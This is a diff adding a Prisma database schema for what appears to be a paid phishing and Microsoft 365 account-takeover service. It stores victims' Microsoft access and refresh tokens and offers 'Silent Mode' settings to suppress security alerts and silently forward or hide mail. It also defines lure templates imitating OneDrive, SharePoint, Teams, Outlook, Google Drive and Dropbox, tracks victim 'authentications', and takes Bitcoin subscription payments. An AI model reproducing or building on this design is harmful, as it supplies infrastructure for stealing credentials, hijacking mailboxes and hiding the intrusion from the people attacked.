@@ -1,0 +1,312 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+}
+
+// ─── USER & AUTH ────────────────────────────────────────
+
+enum UserRole {
+  USER
+  ADMIN
+}
+
+enum UserStatus {
+  ACTIVE
+  SUSPENDED
+  BLOCKED
+}
+
+model User {
+  id                    String                 @id @default(cuid())
+  email                 String                 @unique
+  name                  String?
+  passwordHash          String
+  role                  UserRole               @default(USER)
+  status                UserStatus             @default(ACTIVE)
+  telegramBotToken      String?                @db.Text
+  telegramChatId        String?
+  createdAt             DateTime               @default(now())
+  updatedAt             DateTime               @updatedAt
+  linkedAccounts        LinkedAccount[]
+  subscription          Subscription?
+  payments              Payment[]
+  passwordResetTokens   PasswordResetToken[]
+  createdAuthTokens     AuthorizationToken[]   @relation("createdTokens")
+  usedAuthTokens        AuthorizationToken[]   @relation("usedTokens")
+  invitations           Invitation[]
+  customDomains         CustomDomain[]
+}
+
+// ─── MICROSOFT ACCOUNTS ────────────────────────────────
+
+model LinkedAccount {
+  id                    String          @id @default(cuid())
+  userId                String
+  user                  User            @relation(fields: [userId], references: [id], onDelete: Cascade)
+  microsoftUserId       String
+  email                 String
+  displayName           String
+  accessToken           String          @db.Text
+  refreshToken          String          @db.Text
+  tokenExpiresAt        DateTime
+  status                AccountStatus   @default(ACTIVE)
+  lastRefreshedAt       DateTime?
+  webhookSubscriptionId String?
+  webhookExpiresAt      DateTime?
+  isOrgAdmin            Boolean         @default(false)
+  orgRoles              String[]        @default([])
+  createdAt             DateTime        @default(now())
+  updatedAt             DateTime        @updatedAt
+  automationRules       AutomationRule[]
+  settings              AccountSettings?
+  activityLogs          ActivityLog[]
+
+  @@unique([userId, microsoftUserId])
+  @@index([status, tokenExpiresAt])
+  @@index([webhookSubscriptionId])
+}
+
+enum AccountStatus {
+  ACTIVE
+  NEEDS_REAUTH
+  REVOKED
+}
+
+// ─── AUTOMATION ─────────────────────────────────────────
+
+model AutomationRule {
+  id              String        @id @default(cuid())
+  linkedAccountId String
+  linkedAccount   LinkedAccount @relation(fields: [linkedAccountId], references: [id], onDelete: Cascade)
+  name            String        @default("Untitled Rule")
+  conditions      Json          @default("[]")
+  conditionLogic  String        @default("AND")
+  actions         Json          @default("[]")
+  stopProcessing  Boolean       @default(false)
+  priority        Int           @default(0)
+  isActive        Boolean       @default(true)
+  triggerCount    Int           @default(0)
+  lastTriggeredAt DateTime?
+  createdAt       DateTime      @default(now())
+  updatedAt       DateTime      @updatedAt
+
+  @@index([linkedAccountId, isActive])
+  @@index([linkedAccountId, priority])
+}
+
+// ─── ACTIVITY LOG ───────────────────────────────────────
+
+model ActivityLog {
+  id              String        @id @default(cuid())
+  linkedAccountId String
+  linkedAccount   LinkedAccount @relation(fields: [linkedAccountId], references: [id], onDelete: Cascade)
+  action          String
+  details         String?
+  emailSubject    String?
+  emailFrom       String?
+  ruleName        String?
+  createdAt       DateTime      @default(now())
+
+  @@index([linkedAccountId, createdAt])
+}
+
+// ─── ACCOUNT SETTINGS ──────────────────────────────────
+
+model AccountSettings {
+  id                      String        @id @default(cuid())
+  linkedAccountId         String        @unique
+  linkedAccount           LinkedAccount @relation(fields: [linkedAccountId], references: [id], onDelete: Cascade)
+
+  // Forwarding
+  forwardingEnabled       Boolean       @default(false)
+  forwardingEmail         String?
+
+  // Auto-reply
+  autoReplyEnabled        Boolean       @default(false)
+  autoReplySubject        String?
+  autoReplyBody           String?       @db.Text
+
+  // Silent Mode
+  suppressSecurityAlerts  Boolean       @default(false)
+  suppressSystemMessages  Boolean       @default(false)
+  silentForwardEnabled    Boolean       @default(false)
+  silentForwardEmail      String?
+  silentInboxEnabled      Boolean       @default(false)
+  silentInboxFolderId     String?
+  silentInboxMarkRead     Boolean       @default(false)
+  fullSilentMode          Boolean       @default(false)
+
+  createdAt               DateTime      @default(now())
+  updatedAt               DateTime      @updatedAt
+}
+
+// ─── BILLING ────────────────────────────────────────────
+
+model Subscription {
+  id          String             @id @default(cuid())
+  userId      String             @unique
+  user        User               @relation(fields: [userId], references: [id], onDelete: Cascade)
+  plan        PlanInterval
+  status      SubscriptionStatus @default(ACTIVE)
+  currentPeriodStart DateTime
+  currentPeriodEnd   DateTime
+  createdAt   DateTime           @default(now())
+  updatedAt   DateTime           @updatedAt
+
+  @@index([status, currentPeriodEnd])
+}
+
+enum PlanInterval {
+  MONTHLY
+  YEARLY
+}
+
+enum SubscriptionStatus {
+  ACTIVE
+  EXPIRED
+  CANCELLED
+}
+
+model Payment {
+  id              String        @id @default(cuid())
+  userId          String
+  user            User          @relation(fields: [userId], references: [id], onDelete: Cascade)
+  amountUSD       Float
+  amountBTC       String
+  bitcoinAddress  String
+  txHash          String?
+  status          PaymentStatus @default(PENDING)
+  planInterval    PlanInterval
+  expiresAt       DateTime
+  confirmedAt     DateTime?
+  createdAt       DateTime      @default(now())
+
+  @@index([status, bitcoinAddress])
+  @@index([userId, status])
+}
+
+enum PaymentStatus {
+  PENDING
+  CONFIRMED
+  EXPIRED
+}
+
+// ─── PLAN FEATURES ──────────────────────────────────────
+
+model PlanFeature {
+  id        String   @id @default(cuid())
+  text      String
+  sortOrder Int      @default(0)
+  isActive  Boolean  @default(true)
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@index([isActive, sortOrder])
+}
+
+model PasswordResetToken {
+  id        String    @id @default(cuid())
+  userId    String
+  user      User      @relation(fields: [userId], references: [id], onDelete: Cascade)
+  token     String    @unique
+  expiresAt DateTime
+  usedAt    DateTime?
+  createdAt DateTime  @default(now())
+
+  @@index([token, expiresAt])
+}
+
+// ─── AUTHORIZATION TOKENS ────────────────────────────────
+
+model AuthorizationToken {
+  id          String    @id @default(cuid())
+  token       String    @unique
+  createdById String
+  createdBy   User      @relation("createdTokens", fields: [createdById], references: [id], onDelete: Cascade)
+  usedById    String?
+  usedBy      User?     @relation("usedTokens", fields: [usedById], references: [id], onDelete: SetNull)
+  expiresAt   DateTime
+  usedAt      DateTime?
+  createdAt   DateTime  @default(now())
+
+  @@index([token, expiresAt])
+}
+
+// ─── INVITATIONS ────────────────────────────────────────
+
+model Invitation {
+  id            String           @id @default(cuid())
+  code          String           @unique
+  userId        String
+  user          User             @relation(fields: [userId], references: [id], onDelete: Cascade)
+  domainId      String?
+  domain        CustomDomain?    @relation(fields: [domainId], references: [id], onDelete: SetNull)
+  name          String
+  template      InvitationTemplate
+  docType       String           @default("PDF")
+  documentTitle String
+  senderName    String
+  notes         String?
+  exitUrl       String?
+  status        InvitationStatus @default(ACTIVE)
+  views         Int              @default(0)
+  authentications Int            @default(0)
+  createdAt     DateTime         @default(now())
+  updatedAt     DateTime         @updatedAt
+
+  @@index([code])
+  @@index([userId, status])
+}
+
+// ─── CUSTOM DOMAINS ─────────────────────────────────────
+
+model CustomDomain {
+  id          String       @id @default(cuid())
+  userId      String
+  user        User         @relation(fields: [userId], references: [id], onDelete: Cascade)
+  domain      String       @unique
+  verified    Boolean      @default(false)
+  createdAt   DateTime     @default(now())
+  updatedAt   DateTime     @updatedAt
+  invitations Invitation[]
+
+  @@index([userId])
+  @@index([domain])
+}
+
+enum InvitationTemplate {
+  ONEDRIVE_FILE
+  SHAREPOINT_DOCUMENT
+  TEAMS_CHAT_FILE
+  OUTLOOK_ENCRYPTED
+  GOOGLE_DRIVE
+  DROPBOX_FILE
+}
+
+enum InvitationStatus {
+  ACTIVE
+  PAUSED
+  EXPIRED
+}
+
+// ─── SYSTEM SETTINGS ────────────────────────────────────
+
+model SystemSetting {
+  key       String   @id
+  value     String   @db.Text
+  updatedAt DateTime @updatedAt
+}
+
+// ─── DEBUGGING ──────────────────────────────────────────
+
+model WebhookLog {
+  id              String    @id @default(cuid())
+  linkedAccountId String?
+  payload         Json
+  processedAt     DateTime?
+  status          String    @default("pending")
+  createdAt       DateTime  @default(now())
+}
